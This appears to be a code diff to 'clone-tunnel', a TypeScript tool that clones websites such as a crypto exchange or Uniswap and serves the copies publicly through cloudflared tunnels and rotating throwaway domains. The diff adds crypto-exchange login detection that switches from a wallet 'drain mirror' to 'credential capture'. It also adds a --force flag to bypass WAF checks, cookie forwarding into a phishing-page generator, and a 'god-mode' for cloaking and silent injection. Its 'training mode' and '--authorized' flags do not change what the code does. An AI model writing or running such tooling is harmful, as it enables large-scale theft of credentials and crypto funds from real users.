@@ -3,15 +3,17 @@
  *
  * Usage:
  *   pnpm clone-tunnel https://example.com
+ *   pnpm clone-tunnel --god-mode --force https://example.com
  *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
  *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
  *
  * Requires: pnpm, tsx, Docker, cloudflared on PATH.
- * Optional: DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN + CLOUDFLARE_ZONE_ID for fixed domains.
+ * Optional: DNSHE_TOKEN + DNSHE_BASE_DOMAIN (god-mode auto subdomain discovery),
+ *           DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN + CLOUDFLARE_ZONE_ID for fixed domains.
  * On success prints only the public URL to stdout.
  */
-import { exec, spawn } from 'node:child_process'
-import { existsSync } from 'node:fs'
+import { spawn } from 'node:child_process'
+import { existsSync, readFileSync } from 'node:fs'
 import { access, writeFile } from 'node:fs/promises'
 import path from 'node:path'
 import { fileURLToPath } from 'node:url'
@@ -27,12 +29,20 @@ import {
   readRotateIntervalHours,
   resolveDuckDnsMirrorUrl,
 } from './lib/clone-tunnel-dns.js'
+import { hasDnsheConfig, provisionDnsheMirror } from './lib/clone-tunnel-dnshe.js'
 import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
 import {
   buildGeneratorArgv,
   buildGeneratorEnv,
   DEFAULT_BACKEND_URL,
 } from './lib/mirror-god-mode.js'
+import {
+  fetchTargetHomepageHtml,
+  isCexDomain,
+  runMirrorProbePipeline,
+  shouldUseCexClone,
+} from './lib/mirror-target-pipeline.js'
+import { writeCexStaticServeFiles } from './lib/cex-clone-lib.js'
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url))
 const REPO_ROOT = path.resolve(__dirname, '..')
@@ -45,6 +55,31 @@ const TRYCF_URL_RE = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i
 const PUBLIC_URL_RE =
   /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i
 
+function loadEnvFile(filePath: string): void {
+  if (!existsSync(filePath)) return
+  const content = readFileSync(filePath, 'utf8')
+  for (const line of content.split(/\r?\n/)) {
+    const trimmed = line.trim()
+    if (!trimmed || trimmed.startsWith('#')) continue
+    const eq = trimmed.indexOf('=')
+    if (eq <= 0) continue
+    const key = trimmed.slice(0, eq).trim()
+    let value = trimmed.slice(eq + 1).trim()
+    if (
+      (value.startsWith('"') && value.endsWith('"')) ||
+      (value.startsWith("'") && value.endsWith("'"))
+    ) {
+      value = value.slice(1, -1)
+    }
+    if (process.env[key] === undefined) {
+      process.env[key] = value
+    }
+  }
+}
+
+loadEnvFile(path.join(REPO_ROOT, '.env'))
+loadEnvFile(path.join(REPO_ROOT, '.env.development'))
+
 interface CliArgs {
   targetUrl: string
   subdomain?: string
@@ -53,6 +88,7 @@ interface CliArgs {
   rotateHours: number
   campaignId?: string
   forceHardwareBypass: boolean
+  force: boolean
 }
 
 function fail(message: string): never {
@@ -68,12 +104,17 @@ function parseArgs(argv: string[]): CliArgs {
   let rotateHours = readRotateIntervalHours()
   let campaignId: string | undefined
   let forceHardwareBypass = false
+  let force = false
 
   for (let i = 0; i < args.length; i++) {
     const arg = args[i]!
     if (arg === '--god-mode') {
       godMode = true
       rotate = true
+      args.splice(i, 1)
+      i--
+    } else if (arg === '--force') {
+      force = true
       args.splice(i, 1)
       i--
     } else if (arg === '--rotate') {
@@ -108,7 +149,7 @@ function parseArgs(argv: string[]): CliArgs {
   const raw = args[0]?.trim()
   if (!raw) {
     fail(
-      'Usage: pnpm clone-tunnel [--god-mode] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
+      'Usage: pnpm clone-tunnel [--god-mode] [--force] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
         'Example: pnpm clone-tunnel --god-mode --subdomain myclone https://app.uniswap.org',
     )
   }
@@ -119,7 +160,7 @@ function parseArgs(argv: string[]): CliArgs {
     if (url.protocol !== 'http:' && url.protocol !== 'https:') {
       fail(`Unsupported protocol: ${url.protocol}`)
     }
-    return { targetUrl: url.href, subdomain, godMode, rotate, rotateHours, campaignId, forceHardwareBypass }
+    return { targetUrl: url.href, subdomain, godMode, rotate, rotateHours, campaignId, forceHardwareBypass, force }
   } catch {
     fail(`Invalid target URL: ${raw}`)
   }
@@ -174,11 +215,41 @@ function extractTrycloudflareUrl(output: string): string | null {
   return match?.[0] ?? null
 }
 
+async function generateCexClone(
+  targetUrl: string,
+  outDir: string,
+): Promise<void> {
+  const generator = path.join(REPO_ROOT, 'scripts', 'generate-cex-login-page.ts')
+  await access(generator).catch(() => fail(`CEX generator not found: ${generator}`))
+
+  const childEnv: NodeJS.ProcessEnv = {
+    ...process.env,
+    PHISHING_TRAINING_MODE: 'true',
+    BACKEND_URL: BACKEND_URL,
+  }
+
+  try {
+    await runCommand(
+      'pnpm',
+      ['exec', 'tsx', generator, '--authorized', targetUrl, outDir],
+      { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS },
+    )
+  } catch (e) {
+    fail(`CEX clone generation failed: ${e instanceof Error ? e.message : String(e)}`)
+  }
+
+  await writeCexStaticServeFiles(outDir, MIRROR_PORT)
+  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
+    fail(`CEX generation finished but docker-compose.yml missing in ${outDir}`),
+  )
+}
+
 async function generateClone(
   targetUrl: string,
   outDir: string,
   godMode: boolean,
   forceHardwareBypass: boolean,
+  pipeline?: Awaited<ReturnType<typeof runMirrorProbePipeline>>,
 ): Promise<void> {
   const generator = path.join(REPO_ROOT, 'scripts', 'generate-phishing-page.ts')
   await access(generator).catch(() => fail(`Generator not found: ${generator}`))
@@ -186,6 +257,9 @@ async function generateClone(
     forceHardwareBypass,
   })
   const childEnv = buildGeneratorEnv(godMode, { forceHardwareBypass })
+  if (pipeline?.cookies) {
+    childEnv['MIRROR_PROXY_COOKIES'] = pipeline.cookies
+  }
 
   try {
     await runCommand('pnpm', args, { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS })
@@ -196,6 +270,53 @@ async function generateClone(
   await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
     fail(`Generation finished but docker-compose.yml missing in ${outDir}`),
   )
+}
+
+async function resolveCloneGeneration(
+  cli: CliArgs,
+  outDir: string,
+): Promise<'mirror' | 'cex'> {
+  const target = new URL(cli.targetUrl)
+  await import('node:fs/promises').then((fs) => fs.mkdir(outDir, { recursive: true }))
+
+  const homepageHtml = await fetchTargetHomepageHtml(target)
+  if (!cli.force && shouldUseCexClone(target, homepageHtml)) {
+    console.error(
+      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
+    )
+    await generateCexClone(cli.targetUrl, outDir)
+    return 'cex'
+  }
+
+  const pipeline = await runMirrorProbePipeline(target, outDir, { force: cli.force })
+
+  if (!cli.force && pipeline.strategy === 'cex') {
+    console.error(
+      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
+    )
+    await generateCexClone(cli.targetUrl, outDir)
+    return 'cex'
+  }
+
+  if (!cli.force && !pipeline.probeOk && !pipeline.html) {
+    if (isCexDomain(target.hostname) || (pipeline.html && shouldUseCexClone(target, pipeline.html))) {
+      console.error(
+        '[clone-tunnel] WAF blocked mirror — falling back to CEX credential capture mode.',
+      )
+      await generateCexClone(cli.targetUrl, outDir)
+      return 'cex'
+    }
+    fail(
+      `WAF probe failed after headless retry: ${pipeline.detail ?? 'unknown'}. Pass --force to attempt raw mirror anyway.`,
+    )
+  }
+
+  if (cli.force) {
+    process.env['MIRROR_FORCE_RAW'] = 'true'
+  }
+
+  await generateClone(cli.targetUrl, outDir, cli.godMode, cli.forceHardwareBypass, pipeline)
+  return 'mirror'
 }
 
 async function freeMirrorPort(): Promise<void> {
@@ -254,38 +375,94 @@ async function waitForMirrorReady(): Promise<void> {
 
 function startCloudflaredTunnel(hostname?: string): Promise<string> {
   return new Promise((resolve, reject) => {
-    const hostnameArg = hostname ? ` --hostname ${hostname}` : ''
-    const cmd = `cloudflared tunnel --url http://localhost:${MIRROR_PORT}${hostnameArg}`
-    exec(
-      cmd,
-      {
-        timeout: TUNNEL_TIMEOUT_MS,
-        maxBuffer: 4 * 1024 * 1024,
-        windowsHide: true,
-      },
-      (err, stdout, stderr) => {
-        const combined = `${stdout}\n${stderr}`
-        const trycfUrl = extractTrycloudflareUrl(combined)
-        if (trycfUrl) {
-          resolve(trycfUrl.replace(/\/$/, ''))
-          return
-        }
-        if (hostname) {
-          resolve(`https://${hostname}`.replace(/\/$/, ''))
-          return
-        }
-        const detail = (stderr || stdout || err?.message || '').trim().slice(0, 500)
-        reject(new Error(detail || 'cloudflared did not return a public URL'))
-      },
-    )
+    const args = ['tunnel', '--url', `http://localhost:${MIRROR_PORT}`]
+    if (hostname) args.push('--hostname', hostname)
+
+    const child = spawn('cloudflared', args, {
+      detached: true,
+      stdio: ['ignore', 'pipe', 'pipe'],
+      shell: process.platform === 'win32',
+      windowsHide: true,
+    })
+
+    let combined = ''
+    let settled = false
+
+    const finish = (url: string) => {
+      if (settled) return
+      settled = true
+      clearTimeout(timer)
+      child.unref()
+      resolve(url.replace(/\/$/, ''))
+    }
+
+    const failTunnel = (detail: string) => {
+      if (settled) return
+      settled = true
+      clearTimeout(timer)
+      try {
+        child.kill('SIGTERM')
+      } catch {
+        /* ignore */
+      }
+      reject(new Error(detail))
+    }
+
+    const onData = (chunk: Buffer) => {
+      combined += chunk.toString()
+      const trycfUrl = extractTrycloudflareUrl(combined)
+      if (trycfUrl) finish(trycfUrl)
+    }
+
+    child.stdout?.on('data', onData)
+    child.stderr?.on('data', onData)
+    child.on('error', (err) => failTunnel(err.message))
+
+    const hostnameDeadlineMs = hostname ? 12_000 : TUNNEL_TIMEOUT_MS
+    const timer = setTimeout(() => {
+      if (hostname) {
+        finish(`https://${hostname}`)
+        return
+      }
+      const detail = combined.trim().slice(0, 500)
+      failTunnel(detail || 'cloudflared did not return a public URL')
+    }, hostnameDeadlineMs)
   })
 }
 
 async function resolveDnsMirrorUrl(
-  rotate: boolean,
-  subdomain?: string,
+  opts: {
+    rotate: boolean
+    godMode: boolean
+    targetUrl: string
+    subdomain?: string
+  },
 ): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
-  if (rotate && hasCloudflareDnsConfig()) {
+  if (opts.godMode && hasDnsheConfig()) {
+    const dnshe = await provisionDnsheMirror(opts.targetUrl)
+    if (dnshe.ok) {
+      try {
+        const tunnelUrl = await startCloudflaredTunnel(dnshe.fqdn)
+        return { url: tunnelUrl, fqdn: dnshe.fqdn, provider: 'dnshe' }
+      } catch (e) {
+        console.error(
+          `[clone-tunnel] cloudflared --hostname ${dnshe.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — falling back`,
+        )
+      }
+    } else {
+      console.error(`[clone-tunnel] DNSHE provisioning failed: ${dnshe.detail} — trying quick tunnel`)
+    }
+  } else if (opts.godMode && !hasDnsheConfig()) {
+    console.error('[clone-tunnel] DNSHE_TOKEN / DNSHE_BASE_DOMAIN not set — using quick tunnel')
+  }
+
+  if (opts.godMode) {
+    console.error('[clone-tunnel] WARNING: falling back to trycloudflare.com quick tunnel')
+    const quickUrl = await startCloudflaredTunnel()
+    return { url: quickUrl, provider: 'trycloudflare' }
+  }
+
+  if (opts.rotate && hasCloudflareDnsConfig()) {
     const created = await createCloudflareMirrorSubdomain()
     if (created.ok) {
       console.error(`[clone-tunnel] Cloudflare DNS: ${created.mirrorUrl}`)
@@ -299,8 +476,8 @@ async function resolveDnsMirrorUrl(
     console.error(`[clone-tunnel] Cloudflare DNS failed: ${created.detail} — trying DuckDNS`)
   }
 
-  if (subdomain && hasDuckDnsConfig()) {
-    const duck = await resolveDuckDnsMirrorUrl(subdomain)
+  if (opts.subdomain && hasDuckDnsConfig()) {
+    const duck = await resolveDuckDnsMirrorUrl(opts.subdomain)
     if (duck.ok) {
       console.error(`[clone-tunnel] DuckDNS: ${duck.mirrorUrl}`)
       return { url: duck.mirrorUrl.replace(/\/$/, ''), fqdn: duck.fqdn, provider: 'duckdns' }
@@ -308,8 +485,8 @@ async function resolveDnsMirrorUrl(
     console.error(`[clone-tunnel] DuckDNS failed: ${duck.detail}`)
   }
 
-  if (subdomain) {
-    const fqdn = `${subdomain}.duckdns.org`
+  if (opts.subdomain) {
+    const fqdn = `${opts.subdomain}.duckdns.org`
     try {
       const tunnelUrl = await startCloudflaredTunnel(fqdn)
       return { url: tunnelUrl, fqdn, provider: 'duckdns+cloudflared' }
@@ -384,8 +561,14 @@ async function main(): Promise<void> {
   if (cli.godMode) {
     console.error('[clone-tunnel] God-mode: silent inject, cloaking, WAF bypass, asset rewrite, experimental stubs')
   }
+  if (cli.force) {
+    console.error('[clone-tunnel] --force: bypassing CEX auto-detection and WAF abort')
+  }
 
-  await generateClone(cli.targetUrl, outDir, cli.godMode, cli.forceHardwareBypass)
+  const mode = await resolveCloneGeneration(cli, outDir)
+  if (mode === 'cex') {
+    console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
+  }
   await startDockerCompose(outDir)
   await waitForMirrorReady()
 
@@ -394,22 +577,21 @@ async function main(): Promise<void> {
   let recordId: string | undefined
   let provider = 'trycloudflare'
 
-  if (cli.rotate || (cli.godMode && (hasCloudflareDnsConfig() || hasDuckDnsConfig()))) {
-    const dns = await resolveDnsMirrorUrl(cli.rotate, cli.subdomain)
-    publicUrl = dns.url
-    fqdn = dns.fqdn
-    recordId = dns.recordId
-    provider = dns.provider
+  const dns = await resolveDnsMirrorUrl({
+    rotate: cli.rotate,
+    godMode: cli.godMode,
+    targetUrl: cli.targetUrl,
+    subdomain: cli.subdomain,
+  })
+  publicUrl = dns.url
+  fqdn = dns.fqdn
+  recordId = dns.recordId
+  provider = dns.provider
 
-    if (provider === 'cloudflare' || provider === 'duckdns') {
-      console.error(
-        `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${MIRROR_PORT} is reachable on VPS`,
-      )
-    }
-  } else {
-    publicUrl = await resolveDnsMirrorUrl(false, cli.subdomain).then((d) => d.url)
-    fqdn = cli.subdomain ? `${cli.subdomain}.duckdns.org` : undefined
-    provider = cli.subdomain ? 'duckdns+cloudflared' : 'trycloudflare'
+  if (provider === 'cloudflare' || provider === 'duckdns') {
+    console.error(
+      `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${MIRROR_PORT} is reachable on VPS`,
+    )
   }
 
   if (!PUBLIC_URL_RE.test(publicUrl)) {
